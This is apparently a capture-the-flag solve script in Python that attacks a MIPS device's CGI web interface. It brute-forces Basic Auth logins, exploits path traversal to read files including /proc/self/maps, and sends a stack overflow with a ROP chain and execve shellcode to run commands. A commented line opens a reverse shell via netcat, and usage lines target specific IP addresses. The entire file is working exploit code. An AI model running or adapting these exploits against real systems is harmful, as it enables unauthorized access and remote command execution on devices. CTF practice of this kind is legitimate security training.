import argparse
import sys
import requests
import base64
from pwn import *
import string
import random


def readfile(filename, url, username = "a", password = "S"):
	t = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(3))
	request_url = "%s/cgi-bin/ping.cgi?ip=127.0.0.1&c=10&t=%s.html" % (url, t)
	request_headers = {"Authorization": "Basic %s" % base64.b64encode(username+":"+password)}
	try:
		requests.get(request_url, headers=request_headers, timeout=1)
	except requests.exceptions.ReadTimeout: 
		pass
	
	request_url = "%s/cgi-bin/main.cgi?page=../../../../tmp/%s.html/../../%s" % (url, t, filename)
	r = requests.get(request_url, headers=request_headers)
	return r.text.strip()

def getLibBase(url):
	maps = readfile("proc/self/maps", url)
	if "File Not Found" in maps:
		return False
	for m in maps.splitlines():
		if "r-xp" in m and "libc.so.0" in m:
			return int(m.split("-")[0],16)
			break

def flag1(url):
	request_url = "%s/cgi-bin/main.cgi?page=flag.html" % url
	for u in string.letters:
		for p in string.letters:
			request_headers = {"Authorization": "Basic %s" % base64.b64encode(u+":"+p)}
			r = requests.get(request_url, headers=request_headers)
			if r.status_code != 401:
				print("[+] Login Success with username=%s, password=%s" % (u, p))
				print("[+] Flag: %s" % r.text.strip())
				return

def flag2(url, username, password):
	print("[+] Flag: %s" % readfile("flag", url, username, password))

def runCommand(command, url):
	context.arch = "mips"
	context.endian = "big"
	base = getLibBase(url)
	print("[+] Base Libc: %s" % hex(base))
	if base == False:
		print("[-] Error to get libc base! Try again please!")
		return
	gadget1 = base + 0x00041a4c # addiu $a0, $sp, 0x18 ; lw $gp, 0x10($sp) ; lw $ra, 0x30($sp) ; nop ; jr $ra ; addiu $sp, $sp, 0x38
	gadget2 = base + 0x00041a40 # move $t9, $a0 ; sw $v0, 0x18($sp) ; jalr $t9 ; addiu $a0, $sp, 0x18

	shell = ""
	shell += pwnlib.shellcraft.mips.pushstr_array("$a1",["/bin/sh","-c", command])
	shell += "lw $a0, 0($a1)\n" # a0 => /bin/sh (pathname)
	shell += "slti $a2, $zero, 0xFFFF\n" # a2 = null (env)
	shell += "ori $v0, $zero, SYS_execve\n" # SYS_execve
	shell += "syscall 0x40404\n"

	username = "admin"
	password = "A"*(0x80+0x14)
	password +=  p32(gadget1)
	password += "B"*0x1c
	password += asm("addiu $sp, $sp, 0x0104 ; jalr $sp ; move $a1, $s4")
	password += "C"*0x0c
	password += p32(gadget2)
	password += "D"*0x108
	password += pwnlib.encoders.encoder.null(asm(shell))

	request_url = "%s/cgi-bin/main.cgi" % url
	request_headers = {"Authorization": "Basic %s" % base64.b64encode(username+":"+password)}
	requests.get(request_url, headers=request_headers)

def flag3(url, username, password):
	# runCommand("nc 127.0.0.1 4646 -e /bin/bash")
	runCommand("/readflag > /tmp/quynhnhu5tuoi", url)
	print("[+] Flag: %s" % readfile("tmp/quynhnhu5tuoi", url, username, password))
	runCommand("rm /tmp/quynhnhu5tuoi", url)



def main():
	print("[*] Author: phieulang1993")
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', help='target\'s url')
	parser.add_argument('--flag', '-f', help='flag 1, 2 or 3')
	parser.add_argument('--username', '-u', help='username for flag 2 or 3')
	parser.add_argument('--password', '-p', help='password for flag 2 or 3')

	args = parser.parse_args()
	if args.url == None and args.flag == None:
		parser.print_help()
		sys.exit()
		
	url = args.url
	if url[-1] == "/":
		url = url[:-1]
	if "http://" not in url:
		url = "http://{0}".format(url)
	
	f = int(args.flag)
	if f == 1:
		flag1(url)
	elif f == 2:
		flag2(url, args.username, args.password)
	elif f == 3:
		flag3(url, args.username, args.password)
	else:
		parser.print_help()
		sys.exit()

if __name__ == '__main__':
	main()

# python solve.py --url="34.126.182.54" --flag=3 --username=a --password=S
# python solve.py --url="34.125.0.41" --flag=1 --username=a --password=S